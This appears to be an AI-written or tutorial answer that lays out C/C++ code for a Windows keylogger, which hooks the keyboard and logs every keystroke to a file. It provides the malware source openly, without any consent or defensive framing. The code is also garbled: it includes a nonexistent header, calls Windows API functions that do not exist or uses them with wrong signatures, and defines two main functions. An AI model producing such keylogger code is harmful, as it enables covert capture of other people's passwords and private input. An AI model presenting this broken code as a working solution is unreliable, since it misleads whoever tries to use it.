Creating a keystroke logger that captures all keystrokes on a Windows computer involves several steps, including setting up a keyboard hook, monitoring key presses, and securely storing the data. Here's a structured approach to achieve this:

### Step-by-Step Explanation:

1. **Include Necessary Headers:**
   - Include the Windows header files for keyboard and kernel functions.
   ```c
   #include <Windows.h>
   #include <kernel32.h>
   #include <iostream>
   #include <fstream>
   #include <ctime>
   #include <error.h>
   ```

2. **Define Data Structures:**
   - Use a struct to store each keystroke with timestamp, type, and ASCII value.
   ```c
   typedef struct Keystroke {
       int Timestamp;
       int Key;
       int IsPressed;
       char ASCII;
       char Modifier;
   } Keystroke;
   ```

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to install a global keyboard hook.
   ```c
   HH_LOCAL = 0;
   HWND hwnd = GetDesktopWindow();
   HHOOK hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL);
   ```

4. **Define the Callback Function:**
   - The callback function handles key presses and logs them.
   ```c
   LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam) {
       // Check if the event is a key press
       if (nCode == HC_ACTION) {
           // Get the key state
           bool bDown = (GetAsyncKeyState(0x7F) & 0x1) != 0;
           // Capture key and modifiers
           int key = wParam;
           char ascii = GetKeyState(key);
           char modifier = ' ';
           if (bDown && (wParam == 0x1 || wParam == 0x2 || wParam == 0x4)) {
               modifier = ' ';
           }
           // Create Keystroke object and log
           Keystroke log;
           log.Timestamp = time(nullptr);
           log.Key = key;
           log.IsPressed = bDown;
           log.ASCII = ascii;
           log.Modifier = modifier;
           // Write to file
           ofstream file("keystrokes.txt", ofstream::app);
           file << log.Timestamp << " " << log.Key << " " << log.ASCII << " " << log.Modifier << endl;
           file.close();
       }
       return CallNextHook(nCode, wParam, lParam);
   }
   ```

5. **Start and Stop the Hook:**
   - Start the hook and wait for key presses.
   ```c
   bool isRunning = true;
   while (isRunning) {
       Sleep(100); // Prevent high CPU usage
       if (!GetLastError() == 0) {
           isRunning = false;
       }
   }
   ```

6. **Remove the Hook:**
   - Properly remove the hook when done.
   ```c
   if (hhook) {
       RemoveWindowHook(hwnd, hhook);
   }
   ```

7. **Error Handling:**
   - Use try-except blocks to handle potential issues.
   ```c
   try {
       // Hook setup and loop
   } catch (int e) {
       cout << "Error: " << e << endl;
   }
   ```

### Full Code:

```c
#include <Windows.h>
#include <kernel32.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <stdexcept>

typedef struct Keystroke {
    int Timestamp;
    int Key;
    int IsPressed;
    char ASCII;
    char Modifier;
} Keystroke;

LRESULT CALLBACK KeyLoggerCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        bool bDown = (GetAsyncKeyState(0x7F) & 0x1) != 0;
        if (bDown) {
            int key = wParam;
            char ascii = GetKeyState(key);
            char modifier = ' ';
            if (wParam == 0x1 || wParam == 0x2 || wParam == 0x4) {
                modifier = ' ';
            }
            Keystroke log;
            log.Timestamp = time(nullptr);
            log.Key = key;
            log.IsPressed = bDown;
            log.ASCII = ascii;
            log.Modifier = modifier;
            std::ofstream file("keystrokes.txt", std::ofstream::app);
            file << log.Timestamp << " " << log.Key << " " << log.ASCII << " " << log.Modifier << std::endl;
            file.close();
        }
    }
    return CallNextHook(nCode, wParam, lParam);
}

int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL);
    KeyLoggerCallback hproc = KeyLoggerCallback;

    bool isRunning = true;
    while (isRunning) {
        Sleep(100);
        if (GetLastError() != 0) {
            isRunning = false;
        }
    }

    if (hhook) {
        RemoveWindowHook(hwnd, hhook);
    }
    return 0;
}

// Run the program
int main()
{
    try {
        return main();
    } catch (int e) {
        std::cerr << "Program failed to start: " << e << std::endl;
        return 1;
    }
}
```

